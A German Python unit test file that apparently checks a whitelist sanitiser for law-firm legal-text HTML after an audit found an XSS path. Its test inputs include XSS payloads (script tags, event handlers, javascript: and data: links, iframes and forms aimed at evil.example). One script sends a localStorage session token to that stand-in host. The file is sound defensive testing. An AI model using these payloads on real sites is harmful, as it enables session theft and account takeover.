"""Unit-Tests für die Bereinigung des Rechtstext-HTML in `app/itrk.py` (Befund S-4).

S-4 (Sicherheitsaudit 2026-09-11, AND-22/AND-34): `/api/itrk` nimmt das von der IT-Recht
Kanzlei gepushte HTML an, das Frontend rendert es per `dangerouslySetInnerHTML`
(`Rechtliches.jsx`, auch auf den öffentlichen Seiten `/datenschutz`, `/impressum`, `/agb`).
Wer das `ITRK_TOKEN` erlangt oder das Kanzlei-Konto kompromittiert, könnte sonst
JavaScript auf der App-Domain ausliefern; weil der Session-Token im `localStorage`
liegt, wäre das die Kontoübernahme.

Getestet wird die echte Logik von `app/itrk.py` ohne Postgres und ohne FastAPI: `app.db`
wird VOR dem Import durch einen Stub ersetzt (Muster aus `tests/test_kontoloeschung.py`).
Die Bereinigung selbst nutzt `nh3` (in `requirements.txt`) – ohne nh3 läuft dieser Test
nicht, ein Stub würde genau die zu prüfende Logik ersetzen.

Ausführung vom Repo-Root:
    python3 -m pytest tests/test_itrk_bereinigung.py -q
    python3 -m unittest tests.test_itrk_bereinigung -v
"""
from __future__ import annotations

import sys
import types
import unittest
import urllib.parse
from contextlib import asynccontextmanager
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
if str(REPO) not in sys.path:
    sys.path.insert(0, str(REPO))

# ---------- Stub für app.db (asyncpg/Postgres werden hier nicht gebraucht) ----------


class FakeCon:
    """Merkert sich die INSERT-Argumente von `itrk.handle`."""

    def __init__(self):
        self.inserts: list[tuple[str, tuple]] = []
        self.db_fehler: Exception | None = None

    async def execute(self, sql, *args):
        if self.db_fehler:
            raise self.db_fehler
        self.inserts.append((sql, args))
        return "INSERT 0 1"

    async def fetchrow(self, sql, *args):
        return None

    async def fetch(self, sql, *args):
        return []


class FakePool:
    def __init__(self):
        self.con = FakeCon()

    @asynccontextmanager
    async def acquire(self):
        yield self.con


_pool_holder: dict = {"pool": None}

# Testisolation (Rebase auf PR #47, AND-84): tests/test_itrk.py (S-6) importiert app.itrk
# bereits mit einem eigenen app.db-Stub. Ein erneutes `from app import itrk` liefert dann
# das schon gebundene Modul, dessen db.pool() None ist (Speichern schlägt fehl). Deshalb
# geladene app-Module beiseitelegen, itrk unten mit dem Stub dieser Datei frisch laden
# und den fremden Zustand danach wiederherstellen.
_fremde_app_module = {
    m: sys.modules.pop(m) for m in list(sys.modules) if m == "app" or m.startswith("app.")
}

db_stub = types.ModuleType("app.db")
db_stub.pool = lambda: _pool_holder["pool"]
sys.modules["app.db"] = db_stub

# Jetzt das echte Modul unter Test importieren.
import app  # noqa: E402,F401  (leeres Paket-__init__, legt `app` als Paket an)
from app import config, itrk  # noqa: E402

# sys.modules für den app-Namensraum exakt auf den Zustand vor dieser Datei zurücksetzen
# (eigener Stub und frisch geladene Module raus, fremde wieder rein), siehe oben. Diese
# Datei hält ihre Modulobjekte (config, itrk) als Referenz.
for _name in [m for m in list(sys.modules) if m == "app" or m.startswith("app.")]:
    del sys.modules[_name]
sys.modules.update(_fremde_app_module)

TEST_TOKEN = "test-token-s4"

# Rechtstext, wie ihn die Kanzlei liefert: nur Textaufbau, keine Skripte.
RECHTSTEXT = (
    "<h2>1. Verantwortlicher</h2>"
    "<p>Erika Musterfrau<br>Musterstraße 1<br>12345 Musterstadt</p>"
    "<p>E-Mail: <a href=\"mailto:info@example.com\">info@example.com</a></p>"
    "<ul><li>Punkt <strong>eins</strong></li><li>Punkt <em>zwei</em></li></ul>"
    "<p>Mehr unter <a href=\"https://example.de/datenschutz\">Datenschutz</a>.</p>"
    "<table><tr><th colspan=\"2\">Feld</th></tr><tr><td>Wert</td><td>2</td></tr></table>"
)


def push_xml(html: str, typ: str = "datenschutz", token: str = TEST_TOKEN) -> bytes:
    """Baut einen LTI-`push`-Request (HTML percent-encodet, wie die Kanzlei ihn sendet)."""
    return (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        "<request>"
        "<api_version>1.0</api_version>"
        "<action>push</action>"
        f"<user_auth_token>{token}</user_auth_token>"
        f"<rechtstext_type>{typ}</rechtstext_type>"
        "<rechtstext_text>Reiner Text</rechtstext_text>"
        f"<rechtstext_html>{urllib.parse.quote_plus(html)}</rechtstext_html>"
        "<rechtstext_title>Datenschutzerklärung</rechtstext_title>"
        "<rechtstext_language>de</rechtstext_language>"
        "<rechtstext_country>DE</rechtstext_country>"
        "</request>"
    ).encode()


class _Basis(unittest.IsolatedAsyncioTestCase):
    """Setzt Fake-Pool und ITRK_TOKEN; beides wird nach dem Test zurückgestellt."""

    def setUp(self):
        self.pool = FakePool()
        _pool_holder["pool"] = self.pool
        self._token_alt = config.ITRK_TOKEN
        config.ITRK_TOKEN = TEST_TOKEN

    def tearDown(self):
        config.ITRK_TOKEN = self._token_alt
        _pool_holder["pool"] = None

    def gespeichertes_html(self) -> str:
        """HTML, das `handle` in die Tabelle `rechtstext` geschrieben hätte."""
        self.assertTrue(self.pool.con.inserts, "es wurde nichts gespeichert")
        _sql, args = self.pool.con.inserts[-1]
        return args[2]  # (typ, titel, html, text, sprache, land)


class TestBereinigeHtml(unittest.TestCase):
    """`itrk.bereinige_html` – Whitelist statt Blacklist."""

    def test_script_tag_fliegt_mitsamt_inhalt_raus(self):
        out = itrk.bereinige_html("<p>Text</p><script>alert('xss')</script>")
        self.assertNotIn("<script", out.lower())
        self.assertNotIn("alert(", out)
        self.assertIn("Text", out)

    def test_event_handler_attribute_werden_entfernt(self):
        out = itrk.bereinige_html(
            '<p onclick="alert(1)">Klick</p><img src="x" onerror="alert(2)">'
            '<body onload="alert(3)">Inhalt</body>')
        low = out.lower()
        for handler in ("onclick", "onerror", "onload"):
            self.assertNotIn(handler, low)
        self.assertNotIn("alert(", low)
        self.assertNotIn("<img", low)   # img ist kein Rechtstext-Tag
        self.assertIn("Klick", out)
        self.assertIn("Inhalt", out)

    def test_javascript_links_werden_entfernt(self):
        varianten = [
            '<a href="javascript:alert(1)">klick</a>',
            '<a href="JaVaScRiPt:alert(1)">klick</a>',
            '<a href="  javascript:alert(1)">klick</a>',
            '<a href="javascript&colon;alert(1)">klick</a>',
            '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">klick</a>',
            '<a href="vbscript:msgbox(1)">klick</a>',
        ]
        for v in varianten:
            out = itrk.bereinige_html(v).lower()
            self.assertNotIn("javascript", out, v)
            self.assertNotIn("data:text/html", out, v)
            self.assertNotIn("vbscript", out, v)
            self.assertNotIn("href=", out, v)
            self.assertIn("klick", out, v)   # Linktext bleibt erhalten

    def test_eingebettete_und_nachladende_elemente_fliegen_raus(self):
        out = itrk.bereinige_html(
            '<iframe src="https://evil.example"></iframe>'
            '<object data="x.swf"></object><embed src="y">'
            '<style>body{display:none}</style>'
            '<form action="https://evil.example"><input name="t"></form>'
            '<base href="https://evil.example/">'
            '<link rel="stylesheet" href="https://evil.example/x.css">'
            '<meta http-equiv="refresh" content="0;url=https://evil.example">'
            '<svg onload="alert(1)"><circle r="9"/></svg>'
            '<!-- Kommentar --><p>bleibt</p>')
        low = out.lower()
        for verboten in ("<iframe", "<object", "<embed", "<style", "<form", "<input",
                         "<base", "<link", "<meta", "<svg", "<!--", "evil.example",
                         "display:none"):
            self.assertNotIn(verboten, low)
        self.assertIn("bleibt", out)

    def test_erlaubter_rechtstext_bleibt_erhalten(self):
        out = itrk.bereinige_html(RECHTSTEXT)
        for erwartet in ("<h2>", "<p>", "<br>", "<ul>", "<li>", "<strong>", "<em>",
                         'href="mailto:info@example.com"',
                         'href="https://example.de/datenschutz"', "<table>", "<th",
                         'colspan="2"', "<td>"):
            self.assertIn(erwartet, out)
        self.assertIn("Verantwortlicher", out)
        self.assertIn("Musterstraße 1", out)

    def test_externer_link_bekommt_noopener(self):
        out = itrk.bereinige_html('<a href="https://example.de/x">Link</a>')
        self.assertIn('rel="noopener noreferrer"', out)

    def test_leere_und_fehlende_eingabe(self):
        self.assertEqual(itrk.bereinige_html(""), "")
        self.assertEqual(itrk.bereinige_html(None), "")

    def test_text_ohne_html_bleibt_unveraendert(self):
        self.assertEqual(itrk.bereinige_html("Nur Text & mehr"), "Nur Text &amp; mehr")


class TestItrkPush(_Basis):
    """`itrk.handle` – der Push-Pfad schreibt nur bereinigtes HTML in die DB."""

    async def test_push_speichert_bereinigtes_html(self):
        böse = ("<h2>Überschrift</h2><p>Text</p>"
                "<script>fetch('https://evil.example?t='+localStorage.koch_token)</script>"
                '<img src=x onerror="alert(1)">'
                '<a href="javascript:alert(2)">mehr</a>')
        antwort = await itrk.handle(push_xml(böse))

        self.assertIn("<status>success</status>", antwort)
        html = self.gespeichertes_html()
        low = html.lower()
        self.assertNotIn("<script", low)
        self.assertNotIn("onerror", low)
        self.assertNotIn("javascript:", low)
        self.assertNotIn("localStorage", html)
        self.assertNotIn("<img", low)
        self.assertIn("<h2>Überschrift</h2>", html)
        self.assertIn("<p>Text</p>", html)
        self.assertIn("mehr", html)

    async def test_push_mit_unbekanntem_token_speichert_nichts(self):
        antwort = await itrk.handle(push_xml("<p>x</p>", token="falsch"))
        self.assertIn("<status>error</status>", antwort)
        self.assertEqual(self.pool.con.inserts, [])

    async def test_push_unveraendert_erlaubter_text(self):
        await itrk.handle(push_xml(RECHTSTEXT))
        html = self.gespeichertes_html()
        self.assertIn("Musterstraße 1", html)
        self.assertIn('href="mailto:info@example.com"', html)

    async def test_db_fehler_liefert_fehler_50(self):
        self.pool.con.db_fehler = RuntimeError("RLS abgelehnt")
        antwort = await itrk.handle(push_xml(RECHTSTEXT))
        self.assertIn("<status>error</status>", antwort)
        self.assertIn("<error>50</error>", antwort)


if __name__ == "__main__":
    unittest.main()
